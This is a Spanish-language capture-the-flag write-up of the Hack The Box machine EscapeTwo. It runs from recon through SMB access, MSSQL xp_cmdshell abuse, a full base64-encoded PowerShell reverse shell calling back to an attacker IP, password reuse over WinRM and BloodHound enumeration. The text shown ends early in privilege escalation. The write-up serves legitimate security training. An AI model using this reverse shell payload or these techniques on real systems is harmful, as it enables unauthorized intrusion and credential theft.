
# EscapeTwo

<figure><img src="/files/wDLkqWDD75ejBw3rRWda" alt=""><figcaption></figcaption></figure>

Tenemos la siguiente pista de inicio:

> Como es común en las pruebas de penetración de Windows de la vida real, iniciarás el pentesting con las credenciales de la siguiente cuenta: `rose / KxEPkKe6R8su`

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -sCV -T5 10.10.11.51
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-17 15:53:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Tenemos un montón de puertos abiertos, lo normal en una máquina windows.

Nos encontramos que el dominio de la máquina es sequel.htb, por lo que la añadiremos al etc/hosts:

```bash
sudo echo "10.10.11.51 sequel.htb" | sudo tee -a /etc/hosts
```

## <mark style="color:purple;">Enumeración</mark>

### DNS

```
dnsenum --enum --dnsserver 10.10.11.51 sequel.htb

dnsenum VERSION:1.3.1

-----   sequel.htb   -----

Host's addresses:
__________________

sequel.htb.                              600      IN    A        10.10.11.51

Name Servers:
______________

dc01.sequel.htb.                         3600     IN    A        10.10.11.51
```

Encontramos que la máquina es el Domain Controller. También añadimos `dc01.sequel.htb` al /etc/hosts.

### Usuarios

```
kerbrute userenum --dc 10.10.11.51 -d sequel.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/17/25 - Ronnie Flathers @ropnop

2025/01/17 16:25:00 >  Using KDC(s):
2025/01/17 16:25:00 >  	10.10.11.51:88

2025/01/17 16:25:00 >  [+] VALID USERNAME:	michael@sequel.htb
2025/01/17 16:25:01 >  [+] VALID USERNAME:	ryan@sequel.htb
2025/01/17 16:25:03 >  [+] VALID USERNAME:	oscar@sequel.htb
2025/01/17 16:25:03 >  [+] VALID USERNAME:	rose@sequel.htb
2025/01/17 16:25:10 >  [+] VALID USERNAME:	administrator@sequel.htb
```

Encontramos varios usuarios dentro del sistema, pero como nos daba la pista al incio ya tenemos las credenciales para el usuario rose, por lo que nos centraremos en ese usuario.

```
rose / KxEPkKe6R8su
```

Vamos a probar a enumerar otros posibles usuarios que no hubiera en la lista de usuarios de xatonet:

```bash
crackmapexec smb sequel.htb -u "rose" -p "KxEPkKe6R8su" --rid-brute | grep SidTypeUser

SMB                      sequel.htb      445    DC01             500: SEQUEL\Administrator (SidTypeUser)
SMB                      sequel.htb      445    DC01             501: SEQUEL\Guest (SidTypeUser)
SMB                      sequel.htb      445    DC01             502: SEQUEL\krbtgt (SidTypeUser)
SMB                      sequel.htb      445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)
SMB                      sequel.htb      445    DC01             1103: SEQUEL\michael (SidTypeUser)
SMB                      sequel.htb      445    DC01             1114: SEQUEL\ryan (SidTypeUser)
SMB                      sequel.htb      445    DC01             1116: SEQUEL\oscar (SidTypeUser)
SMB                      sequel.htb      445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)
SMB                      sequel.htb      445    DC01             1601: SEQUEL\rose (SidTypeUser)
SMB                      sequel.htb      445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)
```

Encontramnos algún usuario más que puede ser interesante, como ca\_svc y sql\_svc.

## <mark style="color:purple;">Acceso por SMB</mark>

Al acceder por SMB nos encontramos un recurso compartido `Accounting Department` interesante:

```bash
smbmap -H 10.10.11.51 -u rose -p 'KxEPkKe6R8su'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.51:445	Name: sequel.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Accounting Department                             	READ ONLY	
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
[*] Closed 1 connections    
```

Vamos a ver su contenido, ya que tenemos permisos de lectura.

```bash
smbclient //10.10.11.51/Accounting\ Department -U rose

Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 10:52:21 2024
  ..                                  D        0  Sun Jun  9 10:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 10:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 10:52:07 2024

		6367231 blocks of size 4096. 924132 blocks available
smb: \> get accounts.xlsx 
getting file \accounts.xlsx of size 6780 as accounts.xlsx (38,7 KiloBytes/sec) (average 38,7 KiloBytes/sec)
smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (58,7 KiloBytes/sec) (average 48,7 KiloBytes/sec)
smb: \>
```

Encontramos 2 excels interesantes, nos los descargamos con `get` y vamos a ver su contenido. Los archivos están corruptos por lo que necesitamos:

```
gnumeric accounts.xlsx

No se pudo encontrar la parte con ID=«rId3» para «workbook.xml»
```

Ese error se produce porque los magic bytes del archivo no se corresponden con los de un xlsx:

```
xxd -l 8 accounts.xlsx
          
00000000: 5048 0403 1400 0808                      PH......
```

Los archivos `.xlsx` tienen los siguientes **magic bytes** en sus primeros 4 bytes:

```
50 4B 03 04
```

Vamos a modificar esto con hexedit:

```bash
sudo apt install hexedit
hexedit accounts.xlsx
```

Verás algo como esto al abrir el archivo:

```
00000000  xx xx xx xx xx xx xx xx  ........
```

Sustituye los primeros 4 bytes por `50 4B 03 04` y con Ctrl +X guardamos y salimos del programa.

Ahora con libreoffice ya podemos abrir el archivo sin problema:

<figure><img src="/files/PBSIrSJXz0leNdANl3PG" alt=""><figcaption></figcaption></figure>

Encontramos las credenciales de un SysAdmin!

```
sa@sequel.htb
MSSQLP@ssw0rd!
```

## <mark style="color:purple;">Conexión a MSSQL</mark>

```sql
impacket-mssqlclient 'sa:MSSQLP@ssw0rd!@10.10.11.51'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> SHOW DATABASES;
ERROR(DC01\SQLEXPRESS): Line 1: Could not find stored procedure 'SHOW'.
SQL (sa  dbo@master)> SELECT DB_NAME() AS CurrentDatabase;
CurrentDatabase   
---------------   
master    
```

Una vez dentro de la base de datos vamos a usar la técnica de XP\_CMDSHELL para ejecutar comandos. No está habilitada por defecto así que lo podemos habilitar de la siguiente manera:

```sql
-- Para permitir que se cambien las opciones avanzadas. 
EXECUTE sp_configure 'show advanced options', 1
GO

-- Para actualizar el valor configurado actualmente para las opciones avanzadas. 
RECONFIGURE
GO  

-- Para habilitar la función. 
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- Para actualizar el valor configurado actualmente para esta característica.  
RECONFIGURE
GO
 
-- Comprobación
EXEC sp_configure 'xp_cmdshell';
name          minimum   maximum   config_value   run_value   
-----------   -------   -------   ------------   ---------   
xp_cmdshell         0         1              1           1   
```

```sql
SQL (sa  dbo@master)> exec xp_cmdshell "whoami"
output           
--------------   
sequel\sql_svc   

NULL    
```

Funciona! por lo que vamos a utilizar esto para crear una reverse shell.

### 1. Generamos payload con msfvenom

```
msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.50 lport=4444 -o reverse_shell.exe 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 1584 bytes
Saved as: reverse_shell.exe
```

```powershell
powershell -w hidden -nop -c $a='10.10.15.50';$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}%   
```

### 2. **Preparar el payload PowerShell**

El comando PowerShell a ejecutar debe ser convertido a Base64. Esto es necesario porque los comandos PowerShell codificados en Base64 son más fáciles de manejar y menos propensos a romperse debido a caracteres especiales.

```powershell
$a='10.10.15.50';$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=New-Object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a, $b);$s=$c.GetStream();while ($true) {start-sleep -m 100;if ($osread.IsCompleted -and $osread.Result -ne 0) {$r=$os.BaseStream.EndRead($osread);$s.Write($ob, 0, $r);$s.Flush();$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);}if ($esread.IsCompleted -and $esread.Result -ne 0) {$r=$es.BaseStream.EndRead($esread);$s.Write($eb, 0, $r);$s.Flush();$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);}if ($s.DataAvailable) {$r=$s.Read($nb, 0, $nb.Length);if ($r -lt 1) {break;} else {$str=$e.GetString($nb, 0, $r);$is.write($str);}}if ($c.Connected -ne $true -or ($c.Client.Poll(1, [System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {break;}if ($p.ExitCode -ne $null) {break;}}"
```

### **3. Convertir a Base64**

En Kali Linux podemos usar python para convertir el comando a Base64:

```powershell
python3 -c "import base64; print(base64.b64encode(('\$a=\'10.10.15.50\';\$b=4444;\$c=New-Object system.net.sockets.tcpclient;\$nb=New-Object System.Byte[] \$c.ReceiveBufferSize;\$ob=New-Object System.Byte[] 65536;\$eb=New-Object System.Byte[] 65536;\$e=New-Object System.Text.UTF8Encoding;\$p=New-Object System.Diagnostics.Process;\$p.StartInfo.FileName=\'cmd.exe\';\$p.StartInfo.RedirectStandardInput=1;\$p.StartInfo.RedirectStandardOutput=1;\$p.StartInfo.RedirectStandardError=1;\$p.StartInfo.UseShellExecute=0;\$q=\$p.Start();\$is=\$p.StandardInput;\$os=\$p.StandardOutput;\$es=\$p.StandardError;\$osread=\$os.BaseStream.BeginRead(\$ob, 0, \$ob.Length, \$null, \$null);\$esread=\$es.BaseStream.BeginRead(\$eb, 0, \$eb.Length, \$null, \$null);\$c.connect(\$a, \$b);\$s=\$c.GetStream();while (\$true) {start-sleep -m 100;if (\$osread.IsCompleted -and \$osread.Result -ne 0) {\$r=\$os.BaseStream.EndRead(\$osread);\$s.Write(\$ob, 0, \$r);\$s.Flush();\$osread=\$os.BaseStream.BeginRead(\$ob, 0, \$ob.Length, \$null, \$null);}if (\$esread.IsCompleted -and \$esread.Result -ne 0) {\$r=\$es.BaseStream.EndRead(\$esread);\$s.Write(\$eb, 0, \$r);\$s.Flush();\$esread=\$es.BaseStream.BeginRead(\$eb, 0, \$eb.Length, \$null, \$null);}if (\$s.DataAvailable) {\$r=\$s.Read(\$nb, 0, \$nb.Length);if (\$r -lt 1) {break;} else {\$str=\$e.GetString(\$nb, 0, \$r);\$is.write(\$str);}}if (\$c.Connected -ne \$true -or (\$c.Client.Poll(1, [System.Net.Sockets.SelectMode]::SelectRead) -and \$c.Client.Available -eq 0)) {break;}if (\$p.ExitCode -ne \$null) {break;}}').encode('utf-16le')).decode('utf-8'))"
```

El resultado será una cadena Base64, algo como:

{% code overflow="wrap" %}

```plaintext
JABhAD0AJwAxADAALgAxADAALgAxADUALgA1ADAAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHMAbwBjAGsAZQB0AHMALgB0AGMAcABjAGwAaQBlAG4AdAA7ACQAbgBiAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AQgB5AHQAZQBbAF0AIAAkAGMALgBSAGUAYwBlAGkAdgBlAEIAdQBmAGYAZQByAFMAaQB6AGUAOwAkAG8AYgA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAANgA1ADUAMwA2ADsAJABlAGIAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBCAHkAdAB....
```

{% endcode %}

### 4. **Ejecutar el comando con mssql-command-tools**

{% embed url="<https://github.com/Mayter/mssql-command-tool/releases>" %}

Descargamos la última release y le damos permisos de ejecución:

```bash
chmod +x mssql-command-tools_Linux_amd64
```

Sustituye `yourbase64here` por la cadena Base64 generada.

```bash
./mssql-command-tools_Linux_amd64 --host 10.10.xx.xx -u "sa" -p 'MSSQLP@ssw0rd!' -c "powershell -e <yourbase64here>"
```

```
sudo ./mssql-command-tools_Linux_amd64 --host 10.10.11.51 -u "sa" -p 'MSSQLP@ssw0rd!' -c "powershell -e JABhAD0AJwAxADAALgAxADAALgAxADUALgA1ADAAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHMAbwBjAGsAZQB0AHMALgB0AGMAcABjAGwAaQBlAG4AdAA7ACQAbgBiAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AQgB5AHQAZQBbAF0AIAAkAGMALgBSAGUAYwBlAGkAdgBlAEIAdQBmAGYAZQByAFMAaQB6AGUAOwAkAG8AYgA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAANgA1ADUAMwA2ADsAJABlAGIAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBCAHkAdABlAFsAXQAgADYANQA1ADMANgA7ACQAZQA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwA7ACQAcAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAOwAkAHAALgBTAHQAYQByAHQASQBuAGYAbwAuAEYAaQBsAGUATgBhAG0AZQA9ACcAYwBtAGQALgBlAHgAZQAnADsAJABwAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAA9ADEAOwAkAHAALgBTAHQAYQByAHQASQBuAGYAbwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAxADsAJABwAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEUAcgByAG8AcgA9ADEAOwAkAHAALgBTAHQAYQByAHQASQBuAGYAbwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AMAA7ACQAcQA9ACQAcAAuAFMAdABhAHIAdAAoACkAOwAkAGkAcwA9ACQAcAAuAFMAdABhAG4AZABhAHIAZABJAG4AcAB1AHQAOwAkAG8AcwA9ACQAcAAuAFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA7ACQAZQBzAD0AJABwAC4AUwB0AGEAbgBkAGEAcgBkAEUAcgByAG8AcgA7ACQAbwBzAHIAZQBhAGQAPQAkAG8AcwAuAEIAYQBzAGUAUwB0AHIAZQBhAG0ALgBCAGUAZwBpAG4AUgBlAGEAZAAoACQAbwBiACwAIAAwACwAIAAkAG8AYgAuAEwAZQBuAGcAdABoACwAIAAkAG4AdQBsAGwALAAgACQAbgB1AGwAbAApADsAJABlAHMAcgBlAGEAZAA9ACQAZQBzAC4AQgBhAHMAZQBTAHQAcgBlAGEAbQAuAEIAZQBnAGkAbgBSAGUAYQBkACgAJABlAGIALAAgADAALAAgACQAZQBiAC4ATABlAG4AZwB0AGgALAAgACQAbgB1AGwAbAAsACAAJABuAHUAbABsACkAOwAkAGMALgBjAG8AbgBuAGUAYwB0ACgAJABhACwAIAAkAGIAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAIAB7AHMAdABhAHIAdAAtAHMAbABlAGUAcAAgAC0AbQAgADEAMAAwADsAaQBmACAAKAAkAG8AcwByAGUAYQBkAC4ASQBzAEMAbwBtAHAAbABlAHQAZQBkACAALQBhAG4AZAAgACQAbwBzAHIAZQBhAGQALgBSAGUAcwB1AGwAdAAgAC0AbgBlACAAMAApACAAewAkAHIAPQAkAG8AcwAuAEIAYQBzAGUAUwB0AHIAZQBhAG0ALgBFAG4AZABSAGUAYQBkACgAJABvAHMAcgBlAGEAZAApADsAJABzAC4AVwByAGkAdABlACgAJABvAGIALAAgADAALAAgACQAcgApADsAJABzAC4ARgBsAHUAcwBoACgAKQA7ACQAbwBzAHIAZQBhAGQAPQAkAG8AcwAuAEIAYQBzAGUAUwB0AHIAZQBhAG0ALgBCAGUAZwBpAG4AUgBlAGEAZAAoACQAbwBiACwAIAAwACwAIAAkAG8AYgAuAEwAZQBuAGcAdABoACwAIAAkAG4AdQBsAGwALAAgACQAbgB1AGwAbAApADsAfQBpAGYAIAAoACQAZQBzAHIAZQBhAGQALgBJAHMAQwBvAG0AcABsAGUAdABlAGQAIAAtAGEAbgBkACAAJABlAHMAcgBlAGEAZAAuAFIAZQBzAHUAbAB0ACAALQBuAGUAIAAwACkAIAB7ACQAcgA9ACQAZQBzAC4AQgBhAHMAZQBTAHQAcgBlAGEAbQAuAEUAbgBkAFIAZQBhAGQAKAAkAGUAcwByAGUAYQBkACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAGUAYgAsACAAMAAsACAAJAByACkAOwAkAHMALgBGAGwAdQBzAGgAKAApADsAJABlAHMAcgBlAGEAZAA9ACQAZQBzAC4AQgBhAHMAZQBTAHQAcgBlAGEAbQAuAEIAZQBnAGkAbgBSAGUAYQBkACgAJABlAGIALAAgADAALAAgACQAZQBiAC4ATABlAG4AZwB0AGgALAAgACQAbgB1AGwAbAAsACAAJABuAHUAbABsACkAOwB9AGkAZgAgACgAJABzAC4ARABhAHQAYQBBAHYAYQBpAGwAYQBiAGwAZQApACAAewAkAHIAPQAkAHMALgBSAGUAYQBkACgAJABuAGIALAAgADAALAAgACQAbgBiAC4ATABlAG4AZwB0AGgAKQA7AGkAZgAgACgAJAByACAALQBsAHQAIAAxACkAIAB7AGIAcgBlAGEAawA7AH0AIABlAGwAcwBlACAAewAkAHMAdAByAD0AJABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAG4AYgAsACAAMAAsACAAJAByACkAOwAkAGkAcwAuAHcAcgBpAHQAZQAoACQAcwB0AHIAKQA7AH0AfQBpAGYAIAAoACQAYwAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBuAGUAIAAkAHQAcgB1AGUAIAAtAG8AcgAgACgAJABjAC4AQwBsAGkAZQBuAHQALgBQAG8AbABsACgAMQAsACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFMAZQBsAGUAYwB0AE0AbwBkAGUAXQA6ADoAUwBlAGwAZQBjAHQAUgBlAGEAZAApACAALQBhAG4AZAAgACQAYwAuAEMAbABpAGUAbgB0AC4AQQB2AGEAaQBsAGEAYgBsAGUAIAAtAGUAcQAgADAAKQApACAAewBiAHIAZQBhAGsAOwB9AGkAZgAgACgAJABwAC4ARQB4AGkAdABDAG8AZABlACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsAYgByAGUAYQBrADsAfQB9AA=="
```

Este comando ejecutará el PowerShell en el sistema remoto.

### 5. **Configurar el listener en Kali**

Asegúrate de que tu máquina atacante tenga un listener en el puerto configurado:

```bash
nc -lvnp 4444
```

Al ejecutar el script recibimos una reverse shell con el objetivo. Estamos dentro!

```
nc -lvnp 4444           

listening on [any] 4444 ...
connect to [10.10.15.50] from (UNKNOWN) [10.10.11.51] 50210
Microsoft Windows [Version 10.0.17763.6659]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
sequel\sql_svc

C:\Windows\system32>
```

## <mark style="color:purple;">Credential Hunting</mark>

En el directorio SQL2019 descubrimos archivos de configuración interesantes:

```powershell
C:\SQL2019\ExpressAdv_ENU> dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3705-289D

 Directory of C:\SQL2019\ExpressAdv_ENU

01/03/2025  07:29 AM    <DIR>          .
01/03/2025  07:29 AM    <DIR>          ..
06/08/2024  02:07 PM    <DIR>          1033_ENU_LP
09/24/2019  09:03 PM                45 AUTORUN.INF
09/24/2019  09:03 PM               788 MEDIAINFO.XML
06/08/2024  02:07 PM                16 PackageId.dat
06/08/2024  02:07 PM    <DIR>          redist
06/08/2024  02:07 PM    <DIR>          resources
09/24/2019  09:03 PM           142,944 SETUP.EXE
09/24/2019  09:03 PM               486 SETUP.EXE.CONFIG
06/08/2024  02:07 PM               717 sql-Configuration.INI
09/24/2019  09:03 PM           249,448 SQLSETUPBOOTSTRAPPER.DLL
06/08/2024  02:07 PM    <DIR>          x64
               7 File(s)        394,444 bytes
               6 Dir(s)   3,534,749,696 bytes free

C:\SQL2019\ExpressAdv_ENU>
```

```powershell
C:\SQL2019\ExpressAdv_ENU>cat sql-Configuration.INI
cat sql-Configuration.INI
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\SQL2019\ExpressAdv_ENU>type sql-Configuration.INI
type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL="0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Conseguimos las credenciales de sql\_svc:

```
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```

## <mark style="color:purple;">User flag</mark>

Vamos a probar a conectarnos por evil-winrm con estas credenciales:

```bash
evil-winrm -i 10.10.11.51 -u sql_svc -p 'WqSZAF6CysDQbGb3'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

Nos da error, por lo que probaremos esa contraseña con otros usuarios de la máquina. Recordamos que teníamos los usuarios:

```
2025/01/17 16:25:00 >  [+] VALID USERNAME:	michael@sequel.htb
2025/01/17 16:25:01 >  [+] VALID USERNAME:	ryan@sequel.htb
2025/01/17 16:25:03 >  [+] VALID USERNAME:	oscar@sequel.htb
2025/01/17 16:25:03 >  [+] VALID USERNAME:	rose@sequel.htb
2025/01/17 16:25:10 >  [+] VALID USERNAME:	administrator@sequel.htb
```

Probando con `ryan` conseguimos acceder con esa contraseña!

```powershell
evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

En el escritorio encontramos la user flag:

```powershell
*Evil-WinRM* PS C:\Users\ryan> cd Desktop
*Evil-WinRM* PS C:\Users\ryan\Desktop> dir

    Directory: C:\Users\ryan\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/21/2025   4:23 AM             34 user.txt

*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
c3daf7de0630de4d50b700b6246eff76
```

## <mark style="color:purple;">Escalada de privilegios</mark>

### Bloodhound

Vamos a usar bloodhound-python para enumerar el sistema remotamente desde Kali Linux:

```bash
bloodhound-python -u ryan -p "WqSZAF6CysDQbGb3" -d sequel.htb -ns 10.10.11.51 -c All

INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 09S
```

Esto nos genera bastantes archivos json:

```bash
ls
